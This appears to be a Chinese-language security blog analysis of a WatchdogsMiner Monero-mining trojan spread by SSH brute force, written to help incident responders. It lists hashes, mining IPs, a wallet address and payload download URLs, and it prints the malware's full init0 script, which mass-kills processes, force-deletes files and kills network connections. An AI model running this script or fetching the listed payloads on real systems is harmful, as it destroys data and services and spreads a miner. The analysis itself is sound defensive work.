*****本文原创作者：Sampson，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  
**

 **2019年5月27日清晨，捕获到一起挖矿木马行为，通过分析，定性为针对“门罗币”的WatchdogsMiner变种挖矿木马入侵事件。**

该木马通过SSH爆破，使用Linux系统的Shell脚本编写下载器，通过wget和curl命令下载“游戏组件dota2.tar.gz，实则是挖矿脚本组件，里面包含了强大的查杀其他挖矿木马的脚本，还有针对不同系统对应的挖矿木马。本文对该挖矿木马核心代码进行分析，便于从事安全事件响应的同行碰到相同类型的挖矿木马可以快速排查，定性安全威胁事件。

![image.png](https://image.3001.net/images/20190529/1559109918_5cee211eda4cb.png!small)

挖矿木马攻击流程  

## **0x00 样本介绍**

样本基本信息：

**样本** |  **MD5** |  **内容**  
---|---|---  
x15cache  |  1b9254279109722a034b7026cd8eb0e7  |  x15cache脚本下载挖矿程序包  
anacron  |  ef6aa42aa0fa26fb6ba8c0af02737585  |  32位挖矿程序  
cron  |  cd6d5fc0fbf8616a1387651432ee7b99  |  64位挖矿程序  
  
## **0x01 详细分析**

x15cache脚本的脚本内容如下所示，主要作用是下载dota2.tar.gz包，并且执行挖矿程序。

![3.png](https://image.3001.net/images/20190527/1558972466_5cec0832b15a3.png!small)

dota2.tar.gz包含了如下文件：

![17.png](https://image.3001.net/images/20190528/1558974034_5cec0e52e4e4c.png!small)

a为脚本文件，作用是删除crontab文件，生成upd并赋权，upd去执行run，run去执行真正的挖矿程序。

![18.png](https://image.3001.net/images/20190528/1558974321_5cec0f711fba7.png!small)

run脚本文件为启动xmr挖矿病毒的脚本，首先执行stop结束脚本，ARCH获取系统版本，根据版本执行对应的挖矿程序。

![16.png](https://image.3001.net/images/20190528/1558974442_5cec0fea953a6.png!small)stop脚本文件为挖矿结束脚本。

![19.png](https://image.3001.net/images/20190528/1558974643_5cec10b3b4a37.png!small)

对anacron和cron文件进行分析，它们分别是32位和64位的挖矿程序，下面以32位的WatchdogMiner变种样本为例分析，通过代码分析该挖矿程序是基于XMRig
2.14.1开源项目开发的。

当参数为1时，挖矿算法支持为cryptonight，支持nicehash.com。

![11.png](https://image.3001.net/images/20190527/1558972485_5cec084588cee.png!small)

挖矿时挖矿配置如下，设置算法为cryptonight，并且启用nicehash.com支持。

![15.png](https://image.3001.net/images/20190527/1558972682_5cec090a509c2.png!small)

当参数为2时，矿机程序采用开源挖矿软件XMRig 2.14.1版本编译。

![12.png](https://image.3001.net/images/20190527/1558972700_5cec091c49ca4.png!small)

流量解析提取如下：

![15.png](https://image.3001.net/images/20190529/1559120920_5cee4c189beea.png!small)

挖矿程序使用的IP地址如下：

5.255.86.129:80挖矿行为

![7.png](https://image.3001.net/images/20190527/1558972755_5cec0953317ef.png!small)

107.191.99.221:80挖矿行为

![8.png](https://image.3001.net/images/20190527/1558972770_5cec0962a261f.png!small)

workforce.ignorelist.com挖矿行为

![9.png](https://image.3001.net/images/20190527/1558972786_5cec09725a8c2.png!small)

XMR钱包地址：

    
    
    45UcbvLNayefqNad3tGpHKPzviQUYHF1mCapMhgRuiiAJPYX4KyRCVg9veTmckPN7
    bDebx51LCuDQYyhFgVbUMhc4qY14CQ

  
  

![10.png](https://image.3001.net/images/20190527/1558972799_5cec097f74431.png!small)

dota2.tar.gz包含init0脚本，用于Linux环境下查杀加密货币矿工的脚本，清理CPU占用高的进程，清理各类挖矿矿池进程，还清理其他恶意程序，如"kworkerds"，"ddgs"等挖矿程序，脚本内容如下。  

    
    
    #!/bin/sh
    
    ##########################################################################################\
    ### A script for killing cryptocurrecncy miners in a Linux enviornment
    ### Provided with zero liability (!)
    ###
    ### Some of the malware used as sources for this tool:
    ### https://pastebin.com/pxc1sXYZ
    ### https://pastebin.com/jRerGP1u
    ### SHA256: 2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c4
    ##########################################################################################\
    
    # Killing processes by name, path, arguments and CPU utilization
    processes(){
    	killme() {
    	  killall -9 chron-34e2fg;ps wx|awk '/34e|r\/v3|moy5|defunct/' | awk '{print $1}' | xargs kill -9 & > /dev/null &
    	}
    
    	killa() {
    	what=$1;ps auxw|awk "/$what/" |awk '!/awk/' | awk '{print $2}'|xargs kill -9&>/dev/null&
    	}
    
    	killa 34e2fg
    	killme
    	
    	# Killing big CPU
    	VAR=$(ps uwx|awk '{print $2":"$3}'| grep -v CPU)
    	for word in $VAR
    	do
    	  CPUUSAGE=$(echo $word|awk -F":" '{print $2}'|awk -F"." '{ print $1}')
    	  if [ $CPUUSAGE -gt 60 ]; then echo BIG $word; PID=$(echo $word | awk -F":" '{print $1'});LINE=$(ps uwx | grep $PID);COUNT=$(echo $LINE| grep -P "er/v5|34e2|Xtmp|wf32N4|moy5Me|ssh"|wc -l);if [ $COUNT -eq 0 ]; then echo KILLING $line; fi;kill $PID;fi;
    	done
    
    	killall \.Historys
    	killall \.sshd
    	killall neptune
    	killall xm64
    	killall xm32
    	killall xmrig
    	killall \.xmrig
    	killall suppoieup
    
    	pkill -f sourplum
    	pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
    	
    	ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmrigDaemon" | awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "xmrigMiner" | awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "/var/tmp/java" | awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
    	ps auxf|grep -v grep|grep "/var/tmp/sustes" | awk '{print $2}'|xargs kill -9
    
    	ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
    	ps auxf|grep named| awk '{print $2}'|xargs kill -9
    	ps auxf|grep kernelcfg| awk '{print $2}'|xargs kill -9
    	ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
    	ps auxf|grep kernelupgrade| awk '{print $2}'|xargs kill -9
    	ps auxf|grep kernelorg| awk '{print $2}'|xargs kill -9
    	ps auxf|grep kernelupdates| awk '{print $2}'|xargs kill -9
    
    	ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
    	ps ax|grep -o './[0-9]* -c'| xargs pkill -f
    
    	pkill -f /usr/bin/.sshd
    	pkill -f acpid
    	pkill -f AnXqV.yam
    	pkill -f apaceha
    	pkill -f askdljlqw
    	pkill -f bashe
    	pkill -f bashf
    	pkill -f bashg
    	pkill -f bashh
    	pkill -f bashx
    	pkill -f BI5zj
    	pkill -f biosetjenkins
    	pkill -f bonn.sh
    	pkill -f bonns
    	pkill -f conn.sh
    	pkill -f conns
    	pkill -f cryptonight
    	pkill -f crypto-pool
    	pkill -f ddg.2011
    	pkill -f deamon
    	pkill -f disk_genius
    	pkill -f donns
    	pkill -f Duck.sh
    	pkill -f gddr
    	pkill -f Guard.sh
    	pkill -f i586
    	pkill -f icb5o
    	pkill -f ir29xc1
    	pkill -f irqba2anc1
    	pkill -f irqba5xnc1
    	pkill -f irqbalanc1
    	pkill -f irqbalance
    	pkill -f irqbnc1
    	pkill -f JnKihGjn
    	pkill -f jweri
    	pkill -f kw.sh
    	pkill -f kworker34
    	pkill -f kxjd
    	pkill -f libapache
    	pkill -f Loopback
    	pkill -f lx26
    	pkill -f mgwsl
    	pkill -f minerd
    	pkill -f minergate
    	pkill -f minexmr
    	pkill -f mixnerdx
    	pkill -f mstxmr
    	pkill -f nanoWatch
    	pkill -f nopxi
    	pkill -f NXLAi
    	pkill -f performedl
    	pkill -f polkitd
    	pkill -f pro.sh
    	pkill -f pythno
    	pkill -f qW3xT.2
    	pkill -f sourplum
    	pkill -f stratum
    	pkill -f sustes
    	pkill -f wnTKYg
    	pkill -f XbashY
    	pkill -f XJnRj
    	pkill -f xmrig
    	pkill -f xmrigDaemon
    	pkill -f xmrigMiner
    	pkill -f ysaydh
    	pkill -f zigw
    	
    	# crond
    	ps ax | grep crond | grep -v grep | awk '{print $1}' > /tmp/crondpid
    	while read crondpid
    	do
    		if [ $(echo  $(ps -p $crondpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
    		then
    			kill $crondpid
    			rm -rf /var/tmp/v3
    		fi
    	done < /tmp/crondpid
    	rm /tmp/crondpid -f
    	 
    	# sshd
    	ps ax | grep sshd | grep -v grep | awk '{print $1}' > /tmp/ssdpid
    	while read sshdpid
    	do
    		if [ $(echo  $(ps -p $sshdpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
    		then
    			kill $sshdpid
    		fi
    	done < /tmp/ssdpid
    	rm -f /tmp/ssdpid
    
    	# syslog
    	ps ax | grep syslogs | grep -v grep | awk '{print $1}' > /tmp/syslogspid
    	while read syslogpid
    	do
    		if [ $(echo  $(ps -p $syslogpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
    		then
    			kill  $syslogpid
    		fi
    	done < /tmp/syslogspid
    	rm /tmp/syslogspid -f
    
    		ps x | grep 'b 22'| awk '{print $1,$5}' > .procs
    
    		cat .procs | while read line
    		do
    
    		pid=`echo $line | awk '{print $1;}'`
    		name=`echo $line | awk '{print $2;}'`
    		#echo $pid $name 
    
    		if [ $(echo $name | wc -c) -lt "13" ]
    			then
    			echo "Found" $pid $name
    			kill -9 $pid
    		fi
    		done
    
    		####################################################
    
    
    		ps x | grep 'd 22'| awk '{print $1,$5}' > .procs
    
    		cat .procs | while read line
    		do
    
    		pid=`echo $line | awk '{print $1;}'`
    		name=`echo $line | awk '{print $2;}'`
    		#echo $pid $name 
    
    		if [ $(echo $name | wc -c) -lt "13" ]
    			then
    			echo "Found" $pid $name
    			kill -9 $pid
    		fi
    		done
    
    }
    
    # Removing miners by known path IOC
    files(){
    	rm /tmp/.cron
    	rm /tmp/.main
    	rm /tmp/.yam* -rf
    	rm -f /tmp/irq
    	rm -f /tmp/irq.sh
    	rm -f /tmp/irqbalanc1
    	rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
    	rm -rf /tmp/*httpd.conf
    	rm -rf /tmp/*httpd.conf*
    	rm -rf /tmp/*index_bak*
    	rm -rf /tmp/.systemd-private-*
    	rm -rf /tmp/.xm*
    	rm -rf /tmp/a7b104c270
    	rm -rf /tmp/conn
    	rm -rf /tmp/conns
    	rm -rf /tmp/httpd.conf
    	rm -rf /tmp/java*
    	rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tmp/config.json /usr/local/lib/libjdk.so
    	rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
    	rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
    	rm -rf /tmp/xm*
    	rm -rf /var/tmp/java*
    }
    
    # Killing and blocking miners by network related IOC
    network(){
    	# Kill by known ports/IPs
    	netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :23 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :143 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :2222 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :3389 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :6665 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :6667 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :8444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    	netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    }	
    
    files
    processes
    network
    echo "DONE"  
    

  

  

## **0x03 相关** **IOC**

###  **MD5**

    
    
     1b9254279109722a034b7026cd8eb0e7
    
    ef6aa42aa0fa26fb6ba8c0af02737585
    
    cd6d5fc0fbf8616a1387651432ee7b99

###  **IP**

    
    
     118.25.7.83:36366
    
    69.28.55.86:443          
    
    
    185.71.65.238
    
    140.82.52.87 

### **URL**

[](http://54.37.70.249/.x15cache)

    
    
    <http://54.37.70.249/.x15cache>
    
    <http://54.37.70.249/dota2.tar.gz>
    
    <http://54.37.70.249/fiatlux-1.0.0.apk>

[](http://54.37.70.249/fiatlux-1.0.0.apk)

##  **0x04 其他平台检测结果**

Virustotal检测结果：

![2.png](https://image.3001.net/images/20190528/1558972849_5cec09b18a65c.png!small)

微步分析结果：

![1.png](https://image.3001.net/images/20190528/1558972864_5cec09c038552.png!small)

 ***本文原创作者：Sampson，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

